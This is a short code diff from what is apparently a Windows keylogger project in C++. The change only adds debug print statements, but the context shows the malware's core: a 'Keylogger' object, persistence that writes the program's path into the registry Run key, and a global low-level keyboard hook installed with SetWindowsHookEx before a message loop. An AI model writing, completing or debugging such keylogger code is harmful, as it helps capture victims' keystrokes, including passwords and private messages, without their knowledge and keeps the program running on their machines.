@@ -6,7 +6,13 @@
 #pragma comment(lib, "User32.lib")
 
 int main(int argc, char* argv[]) {
+
+    std::cerr << "Main started" << std::endl;
+
     Keylogger kl(L"VandeVen");
+
+    std::cerr << "Constructor Finished" << std::endl;
+    
     wchar_t exePath[MAX_PATH];
 
     if (!getPath(exePath, MAX_PATH)) {
@@ -16,6 +22,8 @@ int main(int argc, char* argv[]) {
     if (!WriteRegistryRun(exePath)) {
         std::cerr << "Persistence via Registry Run Key failed." << std::endl;
     }
+
+    std::cerr << "Installing hook..." << std::endl;
 
     HHOOK hKeyboardHook = SetWindowsHookEx(
         WH_KEYBOARD_LL,
@@ -28,7 +36,10 @@ int main(int argc, char* argv[]) {
         std::cerr << "Kb Hook Installation Failed: " << GetLastError() << std::endl;
         return 1;
     }
+    
+    std::cerr << "Hook installed! " << std::endl;
 
+    std::cerr << "Message Loop starting..." << std::endl;
     MSG msg;
     BOOL bRet;
     while (bRet = GetMessage(&msg, NULL, 0, 0) != 0) {
